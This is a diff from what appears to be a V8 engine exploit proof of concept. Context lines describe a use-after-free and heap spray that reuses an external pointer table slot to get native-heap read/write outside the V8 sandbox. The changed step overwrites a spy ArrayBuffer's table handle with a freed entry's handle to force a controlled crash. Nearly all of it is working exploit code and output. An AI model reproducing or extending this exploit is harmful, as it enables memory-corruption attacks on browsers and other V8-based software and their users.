@@ -239,22 +239,36 @@ print('          then free victim → spray spies → spy reuses EPT slot');
 print('          now attacker.DataView → spy\'s backing_store (native C++ heap)');
 print('  Result: arbitrary read/write to native heap outside V8 sandbox isolation\n');
 
-// ── STEP 9: SIGSEGV — EPT zero-page → null backing_store ────────────────────────
-banner('STEP 9 — SIGSEGV: EPT zero-page → null backing_store');
-// EPT is mmap(MAP_ANONYMOUS, 128MB). Pages beyond committed entries are
-// demand-zero: read returns 0, no SIGBUS (no PROT_NONE). Zero backing_store
-// → DataView accesses address 0x0 → null page not mapped → SIGSEGV.
+// ── STEP 9: SIGSEGV — freed EPT entry → tiny freelist chain address ───────────
+banner('STEP 9 — SIGSEGV: freed EPT entry → tiny backing_store address');
+// V8 EPT is mmap(PROT_NONE, 128MB) + mprotect to commit pages.
+// Uncommitted EPT pages are PROT_NONE → SIGBUS on access.
+// SOLUTION: use a FREED EPT entry instead (committed page, but freed value).
 //
-// EPT index 32768 (handle = 32768 << 6 = 0x200000):
-//   index 32768 >> committed ~2048 entries >> in zero-init mmap page
-//   EPT[32768] = 0 (demand-zero) → backing_store = 0 & ~tag = 0x0
-//   getUint32(0) → read at address 0x0 → null page → SIGSEGV
+// When V8 frees an ArrayBuffer, it writes EPT[idx] = (prev_free_head<<6)|freeTag
+// This is a tiny integer (< 2MB). After tag-strip → tiny_addr → not mapped → SIGSEGV.
+//
+// 1. Alloc temp AB  → occupies EPT[N] in a committed page
+// 2. Free temp AB   → EPT[N] = freelist chain value (small int << 6)
+// 3. Set spy[0].handle = N's handle → V8 reads EPT[N] = tiny_int
+// 4. backing_store = tiny_int → DataView getUint32 → access tiny addr → SIGSEGV
 
+let temp_ab = new ArrayBuffer(64);
+let temp_sb  = BigInt(Sandbox.getAddressOf(temp_ab));
+let temp_h   = r32(temp_sb + BigInt(AB_EPT_OFF));
+let temp_idx = BigInt(temp_h) >> 6n;
+print('  temp AB handle=' + hex(temp_h) + '  idx=' + temp_idx);
+
+temp_ab = null;
+%CollectGarbage(1); %CollectGarbage(1);
+print('  freed temp_ab → EPT[' + temp_idx + '] = freelist chain (small int)');
+
+// Refresh spy0_sb in case GC moved spies[0]
+spy0_sb = BigInt(Sandbox.getAddressOf(spies[0]));
 let orig_h2 = r32(spy0_sb + BigInt(AB_EPT_OFF));
-print('  spy[0] ept_handle = ' + hex(orig_h2));
-print('  overwriting → 0x00200000 (EPT index 32768, unallocated zero page)');
-w32(spy0_sb + BigInt(AB_EPT_OFF), 0x00200000);
-print('  EPT[32768] = 0x0 (demand-zero mmap page)');
-print('  backing_store = 0x0 → DataView read → address 0x0 → SIGSEGV\n');
-let sigsegv_val2 = new DataView(spies[0]).getUint32(0, true);
-print('  value = ' + hex(sigsegv_val2));
+print('  spy[0] handle=' + hex(orig_h2) + ' → overwriting with freed handle ' + hex(temp_h));
+w32(spy0_sb + BigInt(AB_EPT_OFF), temp_h);
+print('  EPT[' + temp_idx + '] = (prev_free_idx<<6) = tiny_addr < 2MB');
+print('  backing_store = tiny_addr → definitely unmapped → SIGSEGV\n');
+let crash_val = new DataView(spies[0]).getUint32(0, true);
+print('  val = ' + hex(crash_val));
